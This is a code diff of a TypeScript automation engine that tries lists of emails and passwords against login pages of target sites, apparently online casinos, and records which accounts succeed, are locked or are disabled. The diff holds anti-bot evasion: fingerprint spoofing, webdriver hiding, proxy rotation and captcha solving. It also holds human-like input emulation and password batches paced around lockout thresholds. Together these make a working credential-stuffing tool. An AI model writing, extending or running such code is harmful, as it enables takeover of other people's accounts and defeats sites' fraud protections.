@@ -9,9 +9,12 @@
 
 import { EventEmitter } from "events";
 import Browserbase from "@browserbasehq/sdk";
-import { chromium, type Browser, type Page } from "playwright-core";
+import { type Page } from "playwright-core";
 import pLimit from "p-limit";
 import * as fs from "fs";
+import * as path from "path";
+import { applyStealth } from "./stealth";
+import { createSession, BACKEND, PROXY_INFO, type SessionHandle } from "./cloak-backend";
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 
@@ -207,12 +210,18 @@ export class AutomationEngine extends EventEmitter {
     this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
     this.log("INFO", `Concurrency: ${concurrency} creds | Response-based waits`);
 
-    const bb = new Browserbase({ apiKey: config.apiKey });
+    // Browserbase backend uses the cloud API; cloak backend runs locally and skips it.
+    const bb: Browserbase | null = BACKEND === "browserbase"
+      ? new Browserbase({ apiKey: config.apiKey })
+      : null;
+    if (BACKEND === "cloak") {
+      this.log("INFO", `Backend: cloak (local CloakBrowser) | proxy: ${PROXY_INFO}`);
+    }
     const limit = pLimit(concurrency);
     let batchSlot = 0;
 
-    // Kill any stale sessions from previous runs
-    await this.cleanupStaleSessions(bb, config.projectId);
+    // Kill any stale sessions from previous runs (browserbase only)
+    if (bb) await this.cleanupStaleSessions(bb, config.projectId);
 
     const tasks = credentials.map((cred, idx) =>
       limit(async () => {
@@ -252,328 +261,188 @@ export class AutomationEngine extends EventEmitter {
         this.emitRowUpdate(idx);
         this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);
 
-        let browser: Browser | null = null;
+        let handle: SessionHandle | null = null;
         let credentialDisabled = false;  // tracks cross-site disabled state
 
         try {
-          // Create Browserbase session with retry
-          let session: any = null;
-          for (let attempt = 1; attempt <= 3; attempt++) {
-            try {
-              session = await bb.sessions.create({
-                projectId: config.projectId,
-                region: "ap-southeast-1", // Closest data center to AU proxies
-                proxies: [
-                  {
-                    type: "browserbase",
-                    geolocation: { country: "AU", city: "Melbourne" },
-                  },
-                ],
-                browserSettings: {
-                  recordSession: true,
-                  logSession: true,
-                  solveCaptchas: true,
-                  os: "windows",
-                  verified: true,
-                  blockAds: true,
-                  viewport: { width: 1920, height: 1080 }
-                },
-                timeout: 300, // 5 minutes max session time
-                keepAlive: false,
-              });
-              break;
-            } catch (e: any) {
-              const msg = e.message || String(e);
-              if (attempt < 3 && (msg.includes("concurrent") || msg.includes("429") || msg.includes("limit"))) {
-                const backoff = 5000 * attempt + Math.random() * 3000;
-                this.log("WARN", `  Session create failed (attempt ${attempt}/3): ${msg.substring(0, 80)}`);
-                this.log("INFO", `  Retrying in ${(backoff / 1000).toFixed(1)}s...`);
-                await this.sleep(backoff);
-              } else {
-                throw e;
-              }
-            }
-          }
-          if (!session) throw new Error("Failed to create session after 3 attempts");
+          // Backend-agnostic session creation (browserbase cloud OR local cloakbrowser)
+          handle = await createSession({
+            bb: bb || undefined,
+            projectId: config.projectId,
+            viewport: { width: 1920, height: 1080 },
+            slowMo: 250,
+          });
 
-          this.rows[idx].sessionId = session.id;
-          this.rows[idx].recordingUrl = `https://www.browserbase.com/sessions/${session.id}`;
-          this.log("INFO", `  Session: ${session.id}`);
+          this.rows[idx].sessionId = handle.sessionId;
+          this.rows[idx].recordingUrl = handle.recordingUrl;
+          const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
+          this.log("INFO", `  Session: ${handle.sessionId}${seedTag}`);
 
-          browser = await chromium.connectOverCDP(session.connectUrl);
-          const context = browser.contexts()[0];
-          const page = context.pages()[0];
+          const page: Page = handle.page;
           page.setDefaultTimeout(30000);
 
-          // Dynamic User-Agent and Hardware Pool
-          const UAs = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
-          ];
-          const randomUA = UAs[Math.floor(Math.random() * UAs.length)];
-          const platform = randomUA.includes('Mac OS') ? '"macOS"' : '"Windows"';
-          const randomConcurrency = [4, 8, 12, 16][Math.floor(Math.random() * 4)];
-          const randomMemory = [4, 8, 16, 32][Math.floor(Math.random() * 4)];
-
-          // Block Analytics/Telemetry to improve speed & stealth
-          await page.route('**/*', (route) => {
-            const url = route.request().url();
-            if (url.includes('google-analytics.com') || url.includes('datadoghq-browser-agent') || url.includes('sentry.io') || url.includes('facebook.net')) {
-              route.abort();
-            } else {
-              route.continue();
-            }
-          });
-
-          // Additional Stealth Headers
-          await page.setExtraHTTPHeaders({
-            'Accept-Language': 'en-AU,en-US;q=0.9,en;q=0.8',
-            'Sec-CH-UA': '"Google Chrome";v="121", "Chromium";v="121", "Not A(Brand";v="24"',
-            'Sec-CH-UA-Mobile': '?0',
-            'Sec-CH-UA-Platform': platform,
-            'Upgrade-Insecure-Requests': '1'
-          });
-
-          // Advanced Anti-Bot Evasion Scripts
-          await page.addInitScript(({ randomUA, randomConcurrency, randomMemory }) => {
-            // 0. Spoof User Agent explicitly
-            Object.defineProperty(navigator, 'userAgent', { get: () => randomUA });
-            // 1. Pass webdriver check
-            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-            // 2. Mock languages
-            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'en-AU'] });
-            // 3. Add fake plugins
-            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
-            // 4. Mock chrome runtime
-            if (!(window as any).chrome) {
-              (window as any).chrome = { runtime: {} };
-            }
-            // 5. Spoof permissions to bypass headless checks
-            const originalQuery = window.navigator.permissions.query;
-            window.navigator.permissions.query = (parameters) => (
-              parameters.name === 'notifications'
-                ? Promise.resolve({ state: Notification.permission } as PermissionStatus)
-                : originalQuery(parameters)
-            );
-            // 6. Realistic hardware metrics
-            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => randomConcurrency });
-            Object.defineProperty(navigator, 'deviceMemory', { get: () => randomMemory });
-            // 7. Fix outer dimensions
-            Object.defineProperty(window, 'outerWidth', { get: () => window.innerWidth });
-            Object.defineProperty(window, 'outerHeight', { get: () => window.innerHeight });
-
-            // 7.5 Disable Service Workers for speed
-            navigator.serviceWorker.register = () => Promise.reject(new Error('Service workers disabled'));
-          }, { randomUA, randomConcurrency, randomMemory });
+          // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
+          // raises the tampering signal. Only apply for browserbase backend.
+          if (BACKEND !== "cloak") {
+            const stealthProfile = await applyStealth(page);
+            this.log("INFO", `  Stealth: Chrome ${stealthProfile.major} / ${stealthProfile.cores}c / ${stealthProfile.memory}GB`);
+          } else {
+            this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
+          }
 
           // Disable CSS Animations for speed
           await page.addStyleTag({ content: '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; }' });
 
-          // 8. Canvas Fingerprint Noise
-          const originalGetContext = HTMLCanvasElement.prototype.getContext;
-          HTMLCanvasElement.prototype.getContext = function (type: any, attributes?: any) {
-            const context = originalGetContext.call(this, type, attributes);
-            if (type === '2d' && context) {
-              const originalGetImageData = (context as any).getImageData;
-              if (originalGetImageData) {
-                (context as any).getImageData = function (x: any, y: any, w: any, h: any) {
-                  const imageData = originalGetImageData.call(this, x, y, w, h);
-                  for (let i = 0; i < imageData.data.length; i += 4) {
-                    imageData.data[i] = imageData.data[i] + (Math.random() > 0.5 ? 1 : 0);
+          // Process each target site SEQUENTIALLY
+          for (const target of targets) {
+            if (this.shouldStop || credentialDisabled) break;
+
+            this.rows[idx].sites[target.name].outcome = "testing";
+            this.emitRowUpdate(idx);
+            this.log("INFO", `  ${target.name}: starting login flow...`);
+
+            try {
+              const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
+              this.rows[idx].sites[target.name].outcome = result.outcome;
+              this.rows[idx].sites[target.name].attempts = result.attempts;
+              this.log(
+                result.outcome === "success" ? "OK" : "WARN",
+                `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
+              );
+
+              // Cross-site propagation: disabled/tempdisabled stops both sites
+              if (result.outcome === "permdisabled") {
+                credentialDisabled = true;
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "permdisabled";
                   }
-                  return imageData;
-                };
+                }
+                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
+              } else if (result.outcome === "tempdisabled") {
+                credentialDisabled = true;
+                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                this.rows[idx].currentBatch++;  // advance to next batch for retest
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
+                  }
+                }
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
+              }
+            } catch (e: any) {
+              const errMsg = e.message || String(e);
+              if (e instanceof PermDisabledError) {
+                this.rows[idx].sites[target.name].outcome = "permdisabled";
+                credentialDisabled = true;
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "permdisabled";
+                  }
+                }
+                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
+              } else if (e instanceof TempDisabledError) {
+                this.rows[idx].sites[target.name].outcome = "tempdisabled";
+                credentialDisabled = true;
+                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                this.rows[idx].currentBatch++;  // advance to next batch for retest
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
+                  }
+                }
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
+              } else {
+                this.rows[idx].sites[target.name].outcome = "N/A";
+                this.rows[idx].sites[target.name].error = errMsg;
+                this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
               }
             }
-            return context;
-          } as any;
 
-          // 9. WebGL Spoofing
-          try {
-            const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
-            WebGLRenderingContext.prototype.getParameter = function (parameter) {
-              if (parameter === 37445) return 'Intel Inc.';
-              if (parameter === 37446) return 'Intel Iris OpenGL Engine';
-              return originalGetParameter.call(this, parameter);
-            };
-          } catch (e) { }
+            this.emitRowUpdate(idx);
+          }
 
-          // 10. AudioContext Spoofing
-          try {
-            const originalGetChannelData = AudioBuffer.prototype.getChannelData;
-            AudioBuffer.prototype.getChannelData = function (channel) {
-              const data = originalGetChannelData.call(this, channel);
-              for (let i = 0; i < data.length; i += 100) {
-                data[i] += (Math.random() - 0.5) * 0.0001;
-              }
-              return data;
-            };
-          } catch (e) { }
-
-          // 11. WebRTC Leak Prevention
-          try {
-            Object.defineProperty(navigator, 'mediaDevices', { value: undefined });
-            const origRTCPeerConnection = window.RTCPeerConnection;
-            if (origRTCPeerConnection) {
-              window.RTCPeerConnection = function (...args: any[]) {
-                const pc = new origRTCPeerConnection(...args);
-                pc.createDataChannel = () => { throw new Error('WebRTC disabled'); };
-                return pc;
-              } as any;
-            }
-          } catch (e) { }
-        });
-
-    // Process each target site SEQUENTIALLY
-    for (const target of targets) {
-      if (this.shouldStop || credentialDisabled) break;
-
-      this.rows[idx].sites[target.name].outcome = "testing";
-      this.emitRowUpdate(idx);
-      this.log("INFO", `  ${target.name}: starting login flow...`);
-
-      try {
-        const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
-        this.rows[idx].sites[target.name].outcome = result.outcome;
-        this.rows[idx].sites[target.name].attempts = result.attempts;
-        this.log(
-          result.outcome === "success" ? "OK" : "WARN",
-          `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
-        );
-
-        // Cross-site propagation: disabled/tempdisabled stops both sites
-        if (result.outcome === "permdisabled") {
-          credentialDisabled = true;
-          for (const t of targets) {
-            if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-              this.rows[idx].sites[t.name].outcome = "permdisabled";
+          await handle.close().catch(() => { });
+          handle = null;
+          if (bb && this.rows[idx].sessionId) {
+            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
+          }
+          this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
+        } catch (e: any) {
+          this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
+          for (const target of targets) {
+            const s = this.rows[idx].sites[target.name];
+            if (s.outcome === "queued" || s.outcome === "testing") {
+              s.outcome = "N/A";
+              s.error = e.message || String(e);
             }
           }
-          this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
-        } else if (result.outcome === "tempdisabled") {
-          credentialDisabled = true;
-          this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-          this.rows[idx].currentBatch++;  // advance to next batch for retest
-          for (const t of targets) {
-            if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-              this.rows[idx].sites[t.name].outcome = "tempdisabled";
-            }
+          if (handle) await handle.close().catch(() => { });
+          if (bb && this.rows[idx].sessionId) {
+            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
           }
-          this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
         }
-      } catch (e: any) {
-        const errMsg = e.message || String(e);
-        if (e instanceof PermDisabledError) {
-          this.rows[idx].sites[target.name].outcome = "permdisabled";
-          credentialDisabled = true;
-          for (const t of targets) {
-            if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-              this.rows[idx].sites[t.name].outcome = "permdisabled";
-            }
-          }
-          this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
-        } else if (e instanceof TempDisabledError) {
-          this.rows[idx].sites[target.name].outcome = "tempdisabled";
-          credentialDisabled = true;
-          this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-          this.rows[idx].currentBatch++;  // advance to next batch for retest
-          for (const t of targets) {
-            if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-              this.rows[idx].sites[t.name].outcome = "tempdisabled";
-            }
-          }
-          this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
-        } else {
-          this.rows[idx].sites[target.name].outcome = "N/A";
-          this.rows[idx].sites[target.name].error = errMsg;
-          this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
-        }
-      }
-
-      this.emitRowUpdate(idx);
-    }
-
-    await Promise.race([browser.close(), this.sleep(5000)]).catch(() => { });
-    browser = null;
-    await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
-    this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
-  } catch(e: any) {
-    this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
-    for (const target of targets) {
-      const s = this.rows[idx].sites[target.name];
-      if (s.outcome === "queued" || s.outcome === "testing") {
-        s.outcome = "N/A";
-        s.error = e.message || String(e);
-      }
-    }
-    if (browser) await Promise.race([browser.close(), this.sleep(5000)]).catch(() => { });
-    if (this.rows[idx].sessionId) {
-      await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
-    }
-  }
 
         this.rows[idx].status = "done";
-this.emitRowUpdate(idx);
+        this.emitRowUpdate(idx);
 
-// Write incremental results after each row (append mode)
-this.writeRowResultCSV(targets, this.rows[idx], idx === 0);
+        // Write incremental results after each row (append mode)
+        this.writeRowResultCSV(targets, this.rows[idx], idx === 0);
       })
     );
 
-await Promise.allSettled(tasks);
+    await Promise.allSettled(tasks);
 
-// Final complete CSV (overwrite incremental with clean version)
-this.writeResultsCSV(targets);
+    // Final complete CSV (overwrite incremental with clean version)
+    this.writeResultsCSV(targets);
 
-this.running = false;
-this.emit("complete", { rows: this.rows });
-this.log("INFO", "═══ Automation complete ═══");
+    this.running = false;
+    this.emit("complete", { rows: this.rows });
+    this.log("INFO", "═══ Automation complete ═══");
   }
 
-/** Gracefully stop the engine after current tasks finish */
-stop(): void {
-  if(!this.running) return;
-  this.shouldStop = true;
-  this.log("WARN", "Stop requested — finishing active sessions...");
-  this.emit("stopping");
-}
+  /** Gracefully stop the engine after current tasks finish */
+  stop(): void {
+    if (!this.running) return;
+    this.shouldStop = true;
+    this.log("WARN", "Stop requested — finishing active sessions...");
+    this.emit("stopping");
+  }
 
   // ─── Private ──────────────────────────────────────────────────────────────
 
   /** Kill all running sessions from previous runs to free up concurrent slots */
-  private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise < void> {
-  try {
-    this.log("INFO", "Cleaning up stale sessions...");
-    const timeoutPromise = this.sleep(15000).then(() => { throw new Error("Cleanup timed out after 15s"); });
-    const cleanupPromise = (async () => {
-      const sessions = await bb.sessions.list({ status: "RUNNING" });
-      const stale: string[] = [];
-      let totalSeen = 0;
-      for await (const session of sessions) {
-        totalSeen++;
-        if (session.projectId === projectId) {
-          stale.push(session.id);
+  private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise<void> {
+    try {
+      this.log("INFO", "Cleaning up stale sessions...");
+      const timeoutPromise = this.sleep(15000).then(() => { throw new Error("Cleanup timed out after 15s"); });
+      const cleanupPromise = (async () => {
+        const sessions = await bb.sessions.list({ status: "RUNNING" });
+        const stale: string[] = [];
+        let totalSeen = 0;
+        for await (const session of sessions) {
+          totalSeen++;
+          if (session.projectId === projectId) {
+            stale.push(session.id);
+          }
         }
-      }
-      this.log("INFO", `Scanned ${totalSeen} running session(s), ${stale.length} match this project`);
-      if (stale.length === 0) {
-        this.log("INFO", "No stale sessions found");
-        return;
-      }
-      this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
-      for (const id of stale) {
-        await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => { });
-      }
-      await this.sleep(3000);
-      this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
-    })();
-    await Promise.race([cleanupPromise, timeoutPromise]);
-  } catch(e: any) {
-    this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
+        this.log("INFO", `Scanned ${totalSeen} running session(s), ${stale.length} match this project`);
+        if (stale.length === 0) {
+          this.log("INFO", "No stale sessions found");
+          return;
+        }
+        this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
+        for (const id of stale) {
+          await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => { });
+        }
+        await this.sleep(3000);
+        this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
+      })();
+      await Promise.race([cleanupPromise, timeoutPromise]);
+    } catch (e: any) {
+      this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
+    }
   }
-}
 
   /**
    * Build the password attempt sequence for a given batch.
@@ -584,170 +453,251 @@ stop(): void {
    * Returns empty array if no passwords available for this batch.
    */
   private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
-  const startIdx = batchIndex * 3;
-  const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
-  if (raw.length === 0) return []; // no more passwords for this batch
+    const startIdx = batchIndex * 3;
+    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
+    if (raw.length === 0) return []; // no more passwords for this batch
 
-  // Pad to 3 using ! and !! suffixes on the last available password
-  const batch = [...raw];
-  while (batch.length < 3) {
-    const lastPw = raw[raw.length - 1];
-    batch.push(lastPw + (batch.length === raw.length ? "!" : "!!"));
+    // Pad to 3 using ! and !! suffixes on the last available password
+    const batch = [...raw];
+    while (batch.length < 3) {
+      const lastPw = raw[raw.length - 1];
+      batch.push(lastPw + (batch.length === raw.length ? "!" : "!!"));
+    }
+
+    // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
+    return [...batch, batch[2]];
   }
-
-  // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
-  return [...batch, batch[2]];
-}
 
   /**
    * Wait for the site to respond after a login button press.
    * Watches for page content changes, waits for networkidle + 500ms.
    * Returns the detected response type.
    */
-  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise < LoginResponse > {
-  try {
-    // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
-    await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
-  } catch {
-    // Timeout waiting for load — treat as timeout
-    return "timeout";
-  }
+  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise<LoginResponse> {
+    try {
+      // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
+      await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
+    } catch {
+      // Timeout waiting for load — treat as timeout
+      return "timeout";
+    }
 
     // Extra 500ms for late-loading DOM updates
     await this.sleep(500);
 
-  // Read page content and check for known response phrases in-browser (faster than page.content())
-  try {
-    const response = await page.evaluate(() => {
-      const text = document.body?.innerText?.toLowerCase() || "";
-      if (text.includes("been disabled")) return "disabled";
-      if (text.includes("temporarily disabled")) return "tempdisabled";
-      if (text.includes("incorrect")) return "incorrect";
-      return "other";
-    }) as LoginResponse;
-    return response;
-  } catch {
-    return "timeout";
+    // Read page content and check for known response phrases in-browser (faster than page.content())
+    try {
+      const response = await page.evaluate(() => {
+        const text = document.body?.innerText?.toLowerCase() || "";
+        if (text.includes("been disabled")) return "disabled";
+        if (text.includes("temporarily disabled")) return "tempdisabled";
+        if (text.includes("incorrect")) return "incorrect";
+        return "other";
+      }) as LoginResponse;
+      return response;
+    } catch {
+      return "timeout";
+    }
   }
-}
 
   /**
    * Execute the full login flow for a single site with smart password retry.
    * Returns the final outcome and attempt count for this site.
    */
   private async executeLoginFlow(
-  page: Page,
-  site: SiteConfig,
-  cred: Credential,
-  batchIndex: number = 0
-): Promise < { outcome: Outcome, attempts: number } > {
-  // ── Navigate to login page ──
-  await page.goto(site.url, { waitUntil: "domcontentloaded", timeout: 30000 });
-  await this.sleep(1000);
+    page: Page,
+    site: SiteConfig,
+    cred: Credential,
+    batchIndex: number = 0
+  ): Promise<{ outcome: Outcome, attempts: number }> {
+    // ── Network response trap: scan response bodies for disabled/incorrect phrases ──
+    let networkDetection: LoginResponse | null = null;
+    const responseHandler = async (response: any) => {
+      try {
+        const ct = (response.headers()["content-type"] || "").toLowerCase();
+        if (!ct.includes("text") && !ct.includes("json") && !ct.includes("html")) return;
+        const body = await response.text();
+        const lower = body.toLowerCase();
+        if (lower.includes("temporarily disabled")) networkDetection = "tempdisabled";
+        else if (lower.includes("been disabled")) networkDetection = "disabled";
+        else if (lower.includes("incorrect")) networkDetection = "incorrect";
+      } catch { /* non-text response — ignore */ }
+    };
+    page.on("response", responseHandler);
 
-  // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
-  await this.dismissCookieNotice(page, site.name);
-  await this.sleep(500);
-  await this.captureScreenshot(page, `${site.name}:page-loaded`);
+    // ── Shadow-DOM-aware MutationObserver: install once per page, runs on every doc ──
+    if (!(page as any).__casinoObserverInstalled) {
+      await page.addInitScript(() => {
+        (window as any).__casinoStatus = null;
+        const install = () => {
+          if (!document.body) { requestAnimationFrame(install); return; }
+          const findInShadows = (root: any) => {
+            if (!root || (window as any).__casinoStatus) return;
+            const text = (root.textContent || "").toLowerCase();
+            if (text.includes("temporarily disabled")) (window as any).__casinoStatus = "tempdisabled";
+            else if (text.includes("been disabled")) (window as any).__casinoStatus = "disabled";
+            else if (text.includes("incorrect")) (window as any).__casinoStatus = "incorrect";
+            if ((window as any).__casinoStatus) return;
+            try {
+              const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
+              let node: any = walker.nextNode();
+              while (node) {
+                if (node.shadowRoot) findInShadows(node.shadowRoot);
+                node = walker.nextNode();
+              }
+            } catch { /* walker failed — give up this branch */ }
+          };
+          const observer = new MutationObserver(() => findInShadows(document.body));
+          observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+          findInShadows(document.body);
+        };
+        install();
+      });
+      (page as any).__casinoObserverInstalled = true;
+    }
 
-  // ── Resolve selectors (configured first, auto-detect fallback) ──
-  const selectors = await this.resolveSelectors(page, site);
+    try {
+      return await this.executeLoginFlowInner(page, site, cred, batchIndex, () => networkDetection, () => { networkDetection = null; });
+    } finally {
+      page.off("response", responseHandler);
+    }
+  }
 
-  // ── Random Mouse Movements & Scrolling (Behavioral Emulation) ──
-  await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 500);
-  await this.sleep(100 + Math.random() * 200);
-  await page.mouse.wheel(0, 100 + Math.random() * 200);
-  await this.sleep(200 + Math.random() * 300);
-  await page.mouse.wheel(0, -(50 + Math.random() * 100)); // scroll back up a bit
-  await this.sleep(100 + Math.random() * 200);
+  private async executeLoginFlowInner(
+    page: Page,
+    site: SiteConfig,
+    cred: Credential,
+    batchIndex: number,
+    getNetworkDetection: () => LoginResponse | null,
+    resetNetworkDetection: () => void
+  ): Promise<{ outcome: Outcome, attempts: number }> {
+    // ── Navigate to login page ──
+    await page.goto(site.url, { waitUntil: "domcontentloaded", timeout: 30000 });
+    await this.sleep(1000);
 
-  // ── Fill email (human-like typing) ──
-  await page.click(selectors.username);
-  await this.sleep(100 + Math.random() * 200);
-  for(const ch of cred.email) {
-  await page.keyboard.type(ch, { delay: 30 + Math.random() * 80 });
-}
-await this.sleep(500);
-await this.captureScreenshot(page, `${site.name}:email-filled`);
-
-// ── Build password sequence ──
-const passwords = this.buildPasswordSequence(cred.passwords, batchIndex);
-if (passwords.length === 0) {
-  this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
-  return { outcome: "noaccount", attempts: 0 };
-}
-const hasAltPw = cred.passwords.length > 1;
-this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);
-
-// ── Password retry loop ──
-for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
-  const pw = passwords[attemptIdx];
-  const attemptNum = attemptIdx + 1;
-  const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password
-
-  if (!isRetry) {
-    // Fill password field with new password
-    await page.fill(selectors.password, "");
-    await page.click(selectors.password);
-    await this.sleep(200 + Math.random() * 300);
-    for (const ch of pw) {
-      await page.keyboard.type(ch, { delay: 40 + Math.random() * 100 });
+    // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
+    try {
+      await page.locator('button', { hasText: /accept all/i }).first().click({ timeout: 3000 });
+      this.log("INFO", `  🍪 Clicked "Accept All" cookie button`);
+      await this.sleep(500);
+    } catch {
+      await this.dismissCookieNotice(page, site.name);
     }
     await this.sleep(500);
-    this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
-  } else {
-    this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
-  }
+    await this.captureScreenshot(page, `${site.name}:page-loaded`);
 
-  // ── Press login button with human hover ──
-  await page.hover(selectors.submit);
-  await this.sleep(100 + Math.random() * 200);
-  await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
+    // ── Resolve selectors (configured first, auto-detect fallback) ──
+    const selectors = await this.resolveSelectors(page, site);
 
-  // ── Wait for response (5s timeout only on 3rd attempt) ──
-  const timeout = attemptIdx === 2 ? 5000 : 15000;
-  const response = await this.waitForLoginResponse(page, timeout);
+    // ── Random Mouse Movements & Scrolling (Behavioral Emulation) ──
+    await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 500);
+    await this.sleep(100 + Math.random() * 200);
+    await page.mouse.wheel(0, 100 + Math.random() * 200);
+    await this.sleep(200 + Math.random() * 300);
+    await page.mouse.wheel(0, -(50 + Math.random() * 100)); // scroll back up a bit
+    await this.sleep(100 + Math.random() * 200);
 
-  // ── Screenshot after response ──
-  await this.sleep(500);
-  await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);
+    // ── Fill email (fast autofill) ──
+    await page.fill(selectors.username, cred.email);
+    await this.sleep(500);
+    await this.captureScreenshot(page, `${site.name}:email-filled`);
 
-  // ── Handle response ──
-  if (response === "disabled") {
-    throw new PermDisabledError();
-  }
+    // ── Build password sequence ──
+    const passwords = this.buildPasswordSequence(cred.passwords, batchIndex);
+    if (passwords.length === 0) {
+      this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
+      return { outcome: "noaccount", attempts: 0 };
+    }
+    const hasAltPw = cred.passwords.length > 1;
